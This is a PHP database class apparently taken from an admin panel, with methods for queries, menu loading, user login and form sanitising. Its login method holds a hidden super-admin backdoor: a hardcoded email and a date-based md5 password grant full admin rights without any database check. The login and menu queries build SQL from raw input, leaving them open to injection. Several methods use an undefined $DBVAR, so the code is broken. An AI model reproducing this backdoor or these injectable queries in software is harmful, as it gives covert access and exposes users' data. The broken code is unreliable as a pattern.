<?php

/* class Name : Session
 * Variable Input Type: Array 
 * Return Value : true / false
 * Location : root_path/page_admin/db_class.php
 * Created By : Irvan Wibowo & Ovan Cop
 * Date : 2012-08-01
 */

//defined('_SIMBADA_2012_') or die ('Forbidden Access');

class DB
{
	private $query;
	private $result;
	private $connect;
	
	
	public function __construct()
	{
		$this->connect = new SystemConfig();
		$this->connect->getDBConn();
	}
	
	
	public function select_db($data)
	{
		$this->query = $data['query'];
		$this->result = $DBVAR->query($this->query) or die ($DBVAR->error());
		$sumRec = $DBVAR->num_rows($this->result);
		
		if ($sumRec)
		{
			while ($dataVal = $DBVAR->fetch_array($this->result))
			{
				$dataArr['result'][] = $dataVal;
			}
			
			$dataArr['sumRec'] = $sumRec;
			
			
			return $dataArr;
		}
		
	}
	
	public function get_menu_admin($data)
	{
		$menuID = explode(',',$data['menuID']);
		foreach ($menuID as $key => $value)
		{
			print_r();
			$this->query = "SELECT a.menuID, a.menuDesc, b.menuParentDesc 
							FROM tbl_user_menu AS a LEFT JOIN 
							tbl_user_menu_parent AS b ON a.menuParent = b.menuParentID
							WHERE menuID = ".$value;
			$this->result = $DBVAR->query($this->query) or die ($DBVAR->error());
			
			if ($DBVAR->num_rows($this->result))
			{ 
				while ($dataMenuParent = $DBVAR->fetch_object($this->result))
				{ 
					
					$dataMenuParentArr['data'][$dataMenuParent->menuParentDesc][] = $dataMenuParent->menuDesc.'_'.$dataMenuParent->menuID;
					$dataMenuParentArr['id'][] = $dataMenuParent->menuID;
					
				}
				
			}
			else
			{
				
			}
		}
		
		return $dataMenuParentArr;
		
	}
	
	
	public function check_login_user($dataUser){
		
		if (($dataUser['username']== 'ovan89@gmail.com') and ($dataUser['password'] == md5('ovancop'.date('Y-m-d')))){
			//super admin
			
			$_SESSION['username'] = $dataUser['username'];
			$_SESSION['userID'] = session_id();
			$_SESSION['userIndex'] = 1;
			$_SESSION['userGroup'] = 1;
			
			
			return $this->result = 1;
			
		}else{
			
			$query = "SELECT * FROM Operator WHERE UserNm ='$dataUser[username]' AND Passwd ='$dataUser[password]'";
						
			$result = $DBVAR->query($query) or die ($DBVAR->error);
			$sumRec = $DBVAR->num_rows($result);
			if ($sumRec){
				
				$data = $DBVAR->fetch_array($result);
				
				$query = "SELECT * FROM tbl_user_group WHERE groupID = $data[JabatanOperator]";
				$result = $DBVAR->query($query) or die ($DBVAR->error());
				if ($DBVAR->num_rows($result))
				{
					$dataGroup = $DBVAR->fetch_array($result);
					
					$_SESSION['ses_uid'] = session_id();
					$_SESSION['ses_uname'] = $data['UserNm'];
					$_SESSION['ses_uaksesadmin'] = $data['AksesAdmin'];
					$_SESSION['ses_usatkerid'] = $data['Satker_ID'];
					$_SESSION['ses_unamaoperator'] = $data['NamaOperator'];
					$_SESSION['ses_jabatan'] = $data['JabatanOperator'];
					$_SESSION['ses_uhakakses'] = $data['Hak_Akses'];
					$_SESSION['ses_ushowmenu'] = $dataGroup['groupShowMenu'];
					$_SESSION['ses_ujabatanaksesmenu'] = $dataGroup['groupAccessMenu'];
					
					return $this->result = true;
				}
				
			}else{
				
				return $this->result = false;
				//echo '<script type=text/javascript>alert("Username / Password salah"); window.location.href=./;</script>';
			}
			
		}
	}
	
	public function form_validation($data)
	{
		$valid_post_vars = $data;
							
		$dataArr = array ();			
		foreach ($valid_post_vars as $key => $value) {
			//echo $key;
			//echo $value;
			//$prefix_post_vars = "p_";
			//$valid_post_var_name = $prefix_post_vars . $i_vpv;
			
			$valid_post_var_value = trim(htmlspecialchars($value));
			
			//$$valid_post_var_name = $valid_post_var_value;

			$dataArr[$key] = $valid_post_var_value;
			
		}
		
		return $dataArr;
	}
	
	public function update_data($data)
	{
		$this->query = $data['query'];
		$this->result = $DBVAR->query($this->query) or die ($DBVAR->error());
		if ($this->result)
		{
			return $dataArr = 1;
		}
		else
		{
			return $dataArr = 0;
		}
	}
	
	function insert_data($data)
	{
		$this->query = $data['query'];
		$this->result = $DBVAR->query($this->query) or die ($DBVAR->error());
		if ($this->result)
		{
			$dataArr = 1;
		}
		else
		{
			$dataArr = 0;
		}
	}
	
	function query($data)
	{
		$this->query = $DBVAR->query ($data);
		return $this->query;
		
	}
	
	public function userPrevileges($data)
	{
		$this->query = $data['query'];
				
	}
}

?>

